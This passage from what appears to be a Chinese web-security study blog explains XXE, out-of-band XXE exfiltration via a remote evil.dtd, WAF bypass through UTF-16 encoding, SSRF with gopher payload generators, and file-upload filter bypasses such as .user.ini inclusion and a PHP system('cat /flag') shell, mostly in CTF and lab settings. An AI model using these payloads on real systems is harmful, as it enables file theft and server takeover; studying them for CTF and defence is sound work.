<p>现在<code>WebWolf</code>浏览’进入的<code>请求</code>，你会看到： </p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;method&quot;</span> : <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span> : <span class="string">&quot;/landing&quot;</span>,</span><br><span class="line">  <span class="string">&quot;headers&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;request&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span> : [ <span class="string">&quot;HelloWorld&quot;</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;timeTaken&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，通过<code>XXE</code>能够连接我们自己的服务器，这意味着<code>XXE</code>注入是可能的。 因此，通过<code>XXE</code>注入我们基本上能够达到，<code>curl</code>命令的相同的效果 </p>
<h4 id="引用远程服务器上的DTD"><a href="#引用远程服务器上的DTD" class="headerlink" title="引用远程服务器上的DTD"></a>引用远程服务器上的DTD</h4><p>另一种方式<code>% 变量</code>(有空格)，该方式只能在DTD中进行变量引用<code>%变量</code>，而不能在XML中引用。</p>
<p>改为引用远程服务器上的DTD(<code>evil.dtd</code>)</p>
<p>如果在响应包中<strong>无回显又想要读取敏感文件</strong>时，可以通过<code>OOB</code>带外注入的方法<strong>通过外带数据通道来提取数据</strong>，构造<code>payload</code>如下 ：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">//攻击者远程部署evil.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">write</span> <span class="string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:9090/landing?text=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="XXE-介绍与绕过"><a href="#XXE-介绍与绕过" class="headerlink" title="XXE 介绍与绕过"></a>XXE 介绍与绕过</h3><p>一个 <code>xml</code> 文档不仅可以用 <code>UTF-8</code> 编码，也可以用 <code>UTF-16(两个变体 - BE 和 LE)、UTF-32(四个变体 - BE、LE、2143、3412)</code> 和 <code>EBCDIC</code> 编码。 </p>
<p>在这种编码的帮助下，使用<code>正则表达式可以很容易地绕过 WAF</code>，因为在这种类型的 WAF 中，正则表达式<code>通常仅配置为单字符集</code>。 <code>外来编码也可用于绕过成熟的 WAF</code>，因为它们并不总是能够处理上面列出的所有编码。</p>
<p>例如，<code>libxml2</code> 解析器只支持一种类型的 <code>utf-32 - utf-32BE</code>，特别是不支持 <code>BOM</code>。</p>
<blockquote>
<p>一个xml文档不仅可以用UTF-8编码，也可以用UTF-16(两个变体 - BE和LE)、UTF-32(四个变体 - BE、LE、2143、3412)和EBCDIC编码。</p>
<p>在这种编码的帮助下，使用正则表达式可以很容易地绕过WAF，因为在这种类型的WAF中，正则表达式通常仅配置为单字符集。</p>
</blockquote>
<p>在<code>linux</code>使用<code>iconv</code>转编码</p>
<p><code>1.xml</code>的内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">users</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">users</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>alice<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd1<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Alice<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>alice@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>bob<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>passwd2<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span> Bob<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">email</span>&gt;</span>bob@fakesite.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">group</span>&gt;</span>CSAW2019<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">users</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>转<code>编码</code>为<code>UTF-16BE</code></p>
<p>linux下执行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv 1.xml -f UTF-8 -t UTF-16BE -o 2.xml</span><br></pre></td></tr></table></figure>

<h2 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h2><h3 id="不当函数利用"><a href="#不当函数利用" class="headerlink" title="不当函数利用"></a>不当函数利用</h3><blockquote>
<p>PHP中下面函数的使用不当会导致SSRF:<br>&#96;&#96;file_get_contents()<code> </code>fsockopen()<code> </code>curl_exec()&#96;   </p>
</blockquote>
<h4 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h4><blockquote>
<p><code>file_get_content()</code>函数是用于将文件的内容读入到一个字符串中的首选方法，逻辑和前面一样。它支持读取远程文件或者本地文件，也支持多种协议。更多的，它还支持php伪协议，我们可以利用伪协议方法读取本地源码</p>
</blockquote>
<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h4><blockquote>
<p>通过<code>curl_exec()</code>函数执行url传过来参数给的地址，然后将参数返回前端。如果url参数被替换成<a target="_blank" rel="noopener" href="http://xxxx或者curl支持的其他协议等都会被curl执行(curl支持`telnet/">http://xxxx或者curl支持的其他协议等都会被curl执行（curl支持`telnet</a> ftp ftps dict file ldap&#96;等）</p>
</blockquote>
<h3 id="gopher协议总结"><a href="#gopher协议总结" class="headerlink" title="gopher协议总结"></a>gopher协议总结</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121667791">原文</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_60115503/article/details/124407499">另一篇推荐的文章</a></p>
</blockquote>
<blockquote>
<p>gopher协议</p>
<p>是一种信息查0找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这拓宽了 SSRF 的攻击面</p>
</blockquote>
<h4 id="1-利用："><a href="#1-利用：" class="headerlink" title="1)利用："></a>1)利用：</h4><blockquote>
<p>攻击内网的 <code>Redis、Mysql、FastCGI、Ftp</code>等等，也可以发送 <code>GET、POST</code> 请求</p>
</blockquote>
<p>gopher协议的格式：</p>
<blockquote>
<p><code>gopher://IP:port/_TCP/IP数据流</code>  </p>
<p>比如，</p>
<p><code>gopher://127.0.0.1:80/_POST /flag.php HTTP/1.1</code></p>
</blockquote>
<blockquote>
<p>有时候读取文件需要从网站<code>本身的127.0.0.1发出请求</code></p>
<p>可以利用<code>file://</code>伪协议用于读取本地文件</p>
<p>比如<br><code>?url=file:///var/www/html/flag.php</code></p>
</blockquote>
<h4 id="2-GTE请求"><a href="#2-GTE请求" class="headerlink" title="2)GTE请求"></a>2)GTE请求</h4><blockquote>
<p>构造HTTP数据包</p>
<p>URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束</p>
<p>发送gopher协议, 协议后的IP一定要接端口</p>
</blockquote>
<h4 id="3-POST请求"><a href="#3-POST请求" class="headerlink" title="3)POST请求"></a>3)POST请求</h4><blockquote>
<p>POST与GET传参的区别：它有4个参数为必要参数</p>
<p>需要传递<br>Content-Type,<br>Content-Length,<br>host,<br>post的参数</p>
<p>比如：</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1:80</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">36</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">key</span>=<span class="number">51457</span>bb0a50c1eb2c92dcc3ec3c2cc13        //post参数</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Host</code>、<code>Content-Type</code>和<code>Content-Length</code>请求头是必不可少的，但在 GET请求中可以没有<br><code>切记：Content-Length 这个要和底下POST参数[比如例子中key=,4个+51457bb0a50c1eb2c92dcc3ec3c2cc13,32个，共计36个]长度一致</code></p>
</blockquote>
<p>python脚本生成payload（POST和GTE请求都适用）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#对payload中的特殊字符进行编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFL漏洞</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># 对新增的部分继续编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h5 id="构造一个提交文件的POST请求"><a href="#构造一个提交文件的POST请求" class="headerlink" title="构造一个提交文件的POST请求"></a>构造一个提交文件的POST请求</h5><p>首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="gopher打FastCGI"><a href="#gopher打FastCGI" class="headerlink" title="gopher打FastCGI"></a>gopher打FastCGI</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121643002">看我这一篇</a></p>
</blockquote>
<h4 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/unexpectedthing/article/details/121667613">看我这一篇</a></p>
</blockquote>
<h4 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h4><p><code>gopher</code>打<code>mysql</code>，就是利用<code>gopher</code>协议传<code>shell</code>到<code>mysql</code>中。</p>
<p>首先Mysql存在三种连接方式</p>
<blockquote>
<p>Unix套接字；<br>内存共享&#x2F;命名管道；<br>TCP&#x2F;IP套接字；</p>
</blockquote>
<p><code>MySQL</code>客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
<blockquote>
<p>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证<br>当无需密码认证时直接发送TCP&#x2F;IP数据包即可</p>
</blockquote>
<p>这儿对<code>localhost</code>和127.0.0.1做一个区别</p>
<blockquote>
<p><code>localhost</code>也叫local ，正确的解释是：<code>本地服务器。</code><br><code>127.0.0.1</code>的正确解释是：<code>本机地址（本机服务器）</code>，它的解析通过本机的host文件，<code>windows自动将localhost解析为127.0.0.</code>1。</p>
<p><code>localhost（local）</code>是<code>不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制</code>。</p>
<p><code>127.0.0.1</code>是通过<code>网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制</code></p>
<p>简单说<br>当我们通过<code>mysql -hlocalhost -uname</code>去连接的时候，**<code>没有经过网卡</code>**，使用的是<code>unix</code>套接字连接，这种时候我们<code>tcpdump</code>是抓不到包的<br>当我们需要抓取<code>mysql</code>通信数据包时<code>必须使用TCP/IP</code>套接字连接。<br><code>mysql -h 127.0.0.1 -uname</code></p>
</blockquote>
<p>我们平常打<code>mysql</code>最常用的就是打<strong>无密码</strong>的<code>mysql</code></p>
<p>但是我们在用<code>gopher</code>还是需要用<code>dict</code>协议去得到<code>mysql</code>的端口(默认是**<code>3306</code>**)</p>
<p>直接使用的<code>gopherus</code>工具,直接快速生成<code>payload</code></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220815234910350.png"><img src="/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></a></p>
<h2 id="六、文件上传"><a href="#六、文件上传" class="headerlink" title="六、文件上传"></a>六、文件上传</h2><h3 id="1-多重过滤绕过"><a href="#1-多重过滤绕过" class="headerlink" title="1.多重过滤绕过"></a>1.多重过滤绕过</h3><p><u><strong>下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式</strong></u></p>
<p>这里需要绕过的点如下</p>
<blockquote>
<ul>
<li>检查文件内容是否有<code>php</code>字符串</li>
<li>检查后缀中是否有<code>htaccess</code>或<code>php</code></li>
<li>检查文件头部信息</li>
<li>文件<code>MIME</code>类型</li>
</ul>
</blockquote>
<h4 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h4><p>对于<u>第一点</u>可以利用<strong>短标签</strong>绕过，例如 <code>&lt;?=phpinfo();?&gt;</code></p>
<blockquote>
<p>把<code>short_open_tag</code>字段改为<code>On</code>，就可以实现短标签功能</p>
<p>短标签：<br>1.能正常解析类似于这样形式的php文件： <code>phpinfo() ?&gt;</code>  </p>
<p>2.使用<code>&lt;?=$a?&gt;</code>的形式输出，在短标签看来，<code>&lt;?=$a?&gt;</code></p>
<p>3.<code>&lt;?=(表达式)?&gt;</code><br>就相当于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>正确：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从这个对比试验我们可以看出：<br>在短标签模式下，<br>我们执行php语句php函数，都用类似于这样形式的php文件：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">phpinfo</span>();?&gt;</span><br></pre></td></tr></table></figure>

<p>但是我们要输出一个flag，或者变量时，使用<code>&lt;?=$a?&gt;</code>的形式输出</p>
</blockquote>
<h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>对于<u>第二点</u>可以通过上传<code>.user.ini</code>以及正常<code>jpg</code>文件来进行<code>getshell</code>,可以参考以下文章</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
</blockquote>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.<span class="keyword">user</span>.ini内容</span><br><span class="line"></span><br><span class="line">auto_prepend_file=<span class="number">5</span>.jpg</span><br><span class="line"></span><br><span class="line">这样.<span class="keyword">user</span>.ini当前目录下的文件会自动包含图片🐎，从而让我们成功拿到<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<p><u>第三点</u>绕过方式即在文件头部添加一个图片的<strong>文件头</strong>，比如<code>GIF89a</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ：FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(相当于文本的GIF89a)：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>： <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure>

<p><u>第四点</u>绕过方法即修改上传时的<code>Content-Type</code></p>
<p>因此最终的<code>payload</code>为：<br> 上传<code>.user.ini</code>，内容为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>上传a.jpg，内容为</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2.文件类型"></a>2.文件类型</h3><p><a data-fancybox="gallery" data-src="/Web-study/20200226180218842.png"><img src="/Web-study/20200226180218842.png" alt="20200226180218842"></a></p>
<h3 id="3-其他绕过"><a href="#3-其他绕过" class="headerlink" title="3.其他绕过"></a>3.其他绕过</h3><h4 id="1）-DATA绕过"><a href="#1）-DATA绕过" class="headerlink" title="1）::$DATA绕过"></a>1）::$DATA绕过</h4><blockquote>
<p>● 绕过⽅法：</p>
<p>○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。</p>
<p>绕过原理：</p>
<p>● 与上⾯题相⽐呢这个道题去掉了：$file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符</p>
<p>串::$DATA 这⾏代码。</p>
<p>● ::$DATA 是什么意思呢？必须是windows, 必须是php, 必须是那个源⽂件，php在window的时候如</p>
<p>果⽂件名+”::$DATA”会把::$DATA之后的数据当成⽂件流处理,不会检测后缀名.且持”::$DATA”之前</p>
<p>的⽂件名</p>
<p>● 他的⽬的就是不检查后缀名</p>
</blockquote>
<h4 id="2）点-空格-点绕过"><a href="#2）点-空格-点绕过" class="headerlink" title="2）点+空格+点绕过"></a>2）点+空格+点绕过</h4><blockquote>
<p>例如，只允许上传.jpg|.png|.gif后缀的⽂件！</p>
<p>● 绕过⽅法：</p>
<p>○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。</p>
<p>绕过原理：</p>
<p>● 在windows系统下，如果⽂件名以“.”或者空格作为结尾，系统会⾃动删除“.”与空格，利⽤此特性</p>
<p>也可以绕过⿊名单验证。apache中可以利⽤点结尾和空格绕过，asp和aspx中可以⽤空格绕过。</p>
<p>● 经过脚本⼀系列的处理之后原本.php. .的后缀名变成了.php. ，</p>
<p>⽽由于Windows的特性，⼜将⽂件末尾的点给去除了，</p>
<p>最终就存的时候.php的⽂件。同理也可以上传.htaccess. .等⽂件。。。</p>
<p>(就算没有经过脚本的处理,.php. .在windows中也是会被存储为.php)</p>
</blockquote>
<h4 id="3）00截断"><a href="#3）00截断" class="headerlink" title="3）00截断"></a>3）00截断</h4><blockquote>
<p>绕过原理：</p>
<p>● 这时候就要利⽤0x00截断原理了，具体原理是 系统在对⽂件名的读取时，如果遇到0x00，就会认</p>
<p>为读取已结束。</p>
<p>● 但要注意是⽂件的16进制内容⾥的00，⽽不是⽂件名中的00 ！！！就是说系统是按16进制读取⽂</p>
<p>件（或者说⼆进制），</p>
<p>● 遇到ascii码为零的位置就停⽌，⽽这个ascii码为零的位置在16进制中是00，⽤0x开头表示16进</p>
<p>制，也就是所说的0x00截断</p>
<p>● 当系统读取到0x00时，认为已经结束，不会再读取后⾯将要拼接的13.jpg,认为是php⽂件，</p>
<p>完成绕过。</p>
